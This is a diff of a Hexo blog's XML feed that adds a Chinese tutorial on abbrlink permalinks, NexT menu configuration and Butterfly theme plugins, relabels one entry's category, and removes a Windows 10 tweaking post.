+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crc16 &amp; hex</span><br><span class="line">https://post.zz173.com/posts/66c8.html</span><br><span class="line"></span><br><span class="line">crc16 &amp; dec</span><br><span class="line">https://post.zz173.com/posts/65535.html</span><br><span class="line">#32</span><br><span class="line">crc32 &amp; hex</span><br><span class="line">https://post.zz173.com/posts/8ddf18fb.html</span><br><span class="line"></span><br><span class="line">crc32 &amp; dec</span><br><span class="line">https://post.zz173.com/posts/1690090958.html</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>github地址：<a href="https://github.com/Rozbo/hexo-abbrlink">hexo-abbrlink</a></p>
+</blockquote>
+<h2 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h2><p>主题配置文件，关键字：<strong>menu</strong>，删除前面的注释就可以启用</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="comment">#about: /about/ || fa fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">/resources/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-download</span>   <span class="comment">#资源</span></span><br><span class="line">  <span class="attr">tools:</span> <span class="string">/tools/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-briefcase</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable / Disable menu icons / item badges.</span></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>“||”前面是目标链接，后面是图标名称，主题使用图标来自<a href="http://www.fontawesome.com.cn/faicons/#web-application">图标库 - Font Awesome 中文网</a>，可以自己搜索图标使用</p>
+<p>新添加的菜单需要翻译对应的中文，打开theme/next/languages/zh-CN.yml，在menu下设置：</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">关于</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">资源</span></span><br><span class="line">  <span class="attr">search:</span> <span class="string">搜索</span></span><br></pre></td></tr></table></figure>
+
+<p>在根目录下，执行如下命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;resources&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在根目录sources文件夹下会生成categories、tags、about、resources四个文件，每个文件中有一个<code>index.md</code>文件，修改内容分别如下：</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">#例子</span></span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-06-29 11:35:42   # 时间随意</span><br><span class="line">type: &quot;tags&quot;                # 类型一定要为tags</span><br><span class="line">comments: false             # 提示这个页面不需要加载评论</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="主题配置优化"><a href="#主题配置优化" class="headerlink" title="主题配置优化"></a>主题配置优化</h1><p>我选butterfly的主题，所以主题是针对这个主题的，不一定适用其他主题</p>
+<h2 id="butterfly主题文章双栏布局插件"><a href="#butterfly主题文章双栏布局插件" class="headerlink" title="butterfly主题文章双栏布局插件"></a>butterfly主题文章双栏布局插件</h2><p><strong>NPM 插件安装的部署方法：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-butterfly-article-double-row --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"></span><br><span class="line">cnpm i hexo-butterfly-article-double-row --save</span><br></pre></td></tr></table></figure>
+
+<p>注意，一定要加<code>--save</code>，不然本地预览的时候可能不会显示！！！</p>
+<p><strong>新增配置</strong></p>
+<p>是网站根目录下的配置文件_config</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">butterfly_article_double_row:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>然后素质三连。</p>
+<h2 id="Butterfly添加顶部加载进度条"><a href="#Butterfly添加顶部加载进度条" class="headerlink" title="Butterfly添加顶部加载进度条"></a>Butterfly添加顶部加载进度条</h2><p>我使用的是4.7.0版本，版本已经集成了，在配置文件中直接修改就好。</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">2</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span> <span class="string">https://fastly.jsdelivr.net/gh/xlenco/JS-X@main/pace.js/pace.css</span></span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>web渗透</category>
+        <category>Hexo</category>
       </categories>
       <tags>
-        <tag>漏洞利用</tag>
+        <tag>博客</tag>
       </tags>
   </entry>
   <entry>
@@ -1725,49 +1919,6 @@
       </categories>
       <tags>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Win10使用优化</title>
-    <url>/posts/f970716d.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下在win10的 游荡历程，保护一下个人隐私，简化使用，炫酷的大爷可以绕过，希望给各位大爷提供带点有用帮助。勿喷</p>
-<h1 id="关闭自动更新"><a href="#关闭自动更新" class="headerlink" title="关闭自动更新"></a>关闭自动更新</h1><p>相对旧机子，更新后的系统可能会影响电脑的使用体验，所以建议关闭自动更新，当你想更新时子再更新</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.右键&quot;此电脑&quot;，选择&quot;管理&quot;。</span><br><span class="line">2.选择&quot;服务和应用程序=&gt;服务&quot;、然后找到&quot;Windows Update&quot;双击打开 （这里是用名称排序的，从W开始找比较快。）</span><br><span class="line">3.在&quot;常规&quot;选项卡下，把启动类型改为 &quot;禁用&quot;。</span><br><span class="line">4.点击&quot;恢复&quot;选项卡，将&quot;第一次失败&quot;、&quot;第二次失败&quot;、&quot;后续失败&quot;都改为&quot;无操作&quot;，然后点击&quot;确定&quot;（这步非常重要，否则自动更新还会自动开启。</span><br></pre></td></tr></table></figure>
-
-<p><strong>关闭计划任务</strong></p>
-<p>在桌面找到<strong>我的电脑</strong>，右键<strong>管理，</strong>然后依次点击<strong>系统工具，任务计划程序，任务计划程序库，microsoft，windows，windows update，将里面的选项都右键</strong>禁用。</p>
-<h1 id="关闭最近使用文件"><a href="#关闭最近使用文件" class="headerlink" title="关闭最近使用文件"></a>关闭最近使用文件</h1><p>步骤如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开此电脑</span><br><span class="line">切换到选项卡，点击进入</span><br><span class="line">在常规下，隐私内关闭即可</span><br></pre></td></tr></table></figure>
-
-<h1 id="关闭win10一些服务"><a href="#关闭win10一些服务" class="headerlink" title="关闭win10一些服务"></a>关闭win10一些服务</h1><p>在桌面上找到 此电脑 右键—-管理 点击。</p>
-<p>然后如图所示，点开服务。</p>
-<p><strong>关闭并禁用这些服务</strong></p>
-<p><strong>Connected User Experiences and Telemetry</strong></p>
-<p>一个微软操作系统外围辅助服务。这项服务除了收集数据之外，还兼有收集错误和崩溃信息的职责，因此对于微软改进系统也有重要的意义。如果你不介意微软收集这些信息，可以保持服务的开启状态。</p>
-<p><strong>Diagnostic Execution Service</strong></p>
-<p>系统诊断执行服务 没什么卵用</p>
-<p><strong>HomeGroup Listener和HomeGroupProvider</strong></p>
-<p>家庭组服务，没什么卵用.</p>
-<p><strong>windows server</strong></p>
-<p>如果不经常使用系统搜索就关闭它</p>
-<p><strong>Program CompatibilityAssistant Service</strong></p>
-<p>兼容助手服务，</p>
-<p><strong>SecurityCenter</strong></p>
-<p>安全中心服务，直接禁用</p>
-<p><strong>SysMain</strong></p>
-<p>这个服务如果电脑上全部都是固态，可以关闭，要是有机械的话，有一定的作用。</p>
-<p>以上服务全部禁用。</p>
-<h1 id="关闭系统界面特效，优化系统性能"><a href="#关闭系统界面特效，优化系统性能" class="headerlink" title="关闭系统界面特效，优化系统性能"></a><strong>关闭系统界面特效，优化系统性能</strong></h1><p>如果选择 最佳性能的话，字体比较难看，看的不习惯，勾选 平滑字体边缘。其他的根据自己需要勾选，不在乎字体的话，直接 最佳性能</p>
-<p>只勾选：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">平滑滚动列表框</span><br><span class="line">平滑屏幕字体边缘</span><br><span class="line">启用速览</span><br></pre></td></tr></table></figure>
-
-<p>顺便设置下 系统启动设置</p>
-]]></content>
-      <categories>
-        <category>win系统</category>
-      </categories>
-      <tags>
-        <tag>win10</tag>
       </tags>
   </entry>
   <entry>
